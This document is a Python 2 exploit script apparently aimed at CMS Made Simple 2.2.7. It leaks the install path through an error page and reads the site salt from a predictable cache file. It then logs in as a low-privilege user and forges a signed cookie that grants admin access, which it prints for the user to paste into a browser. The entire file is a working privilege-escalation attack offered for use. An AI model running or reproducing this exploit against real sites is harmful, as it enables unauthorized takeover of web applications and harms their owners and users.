#!encoding=utf-8
import requests#you need install this module
import re
import md5
import urllib
import base64
import hashlib
import json
from bs4 import BeautifulSoup#you need install this module


domian='http://127.0.0.1:8002' #Important variable,change it to your value
version='2.2.7' #Important variable
username='test1' #Important variable,change it to your value Normal dashboard user
password='a123123'#Important variable,password

url=domian+'/lib/tasks/class.CmsSecurityCheck.task.php'
res=requests.get(url=url)
if res.content:
	try:
		path=re.findall(r"in <b>(.*?)lib\\tasks\\class.CmsSecurityCheck.task.php",res.content)[0]
	except:
		print 'maybe url error'
		exit()
else:
	print 'network error'
	exit()
realpath=path+'lib\classes\internal\class.LoginOperations.php'+'CMSMS\LoginOperations'+version

_cache_dir='tmp\cache'
__DIR__=path+'lib\classes'
group='CMSMS\internal\global_cache'
key='cms_siteprefs'

m1 = md5.new()
m1.update(__DIR__+group)
variable1=m1.hexdigest()

m1 = md5.new()
m1.update(key+__DIR__)
variable2=m1.hexdigest()

finally_get_path=domian+'/'+_cache_dir+'/cache_'+variable1+'_'+variable2+'.cms'
res=requests.get(url=finally_get_path.replace('\\',"/"))

if res.content:
	try:
		shalt=re.findall(r's:40:"(.*?)";s:8',res.content)[0]#get salt
	except:
		print 'maybe url error'
		exit()
else:
	print 'network error'
	exit()
#print shalt

cookies_title=hashlib.sha1(version+shalt).hexdigest()
#print cookies_title

#Escalate from editor user or designer user to admin
admin_login_url=domian+'/admin/login.php'
user_agent='Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.104 Safari/537.36 Core/1.53.4295.400 QQBrowser/9.7.12661.400'
headers={ "User-Agent":user_agent,"Referer":admin_login_url}
print 'Requesting the following page:'+admin_login_url
print 'Please wait for a moment...'
print
postData={'username': username,'password': password,'loginsubmit': 'loginsubmit'}
user_login=requests.Session()
#account login to get "hash"
try:
	user_login.post(admin_login_url,data = postData,headers = headers)
	cookie_hash=json.loads(base64.b64decode(urllib.unquote(user_login.cookies[cookies_title]).split('::')[1]))['hash']
except:
	print 'error'
	exit()

#print cookie_hash



#make_data=json.dumps(base64.b64encode({'uid':1,'uid':2,'username':'admin','eff_uid':1,'eff_username':None,'hash':cookie_cksum[0]}))
make_data=base64.b64encode(json.dumps({'uid':2,'username':'admin','eff_uid':1,'eff_username':None,'hash':cookie_hash}))
cookies_name=hashlib.sha1(shalt+make_data).hexdigest()

print 'OK'
print 'Please empty the cookie and add the following cookie:'
print 
print cookies_title+'--->'+cookies_name+'::'+make_data
print
print '__c'+'--->'+'512919d4312874cba5d'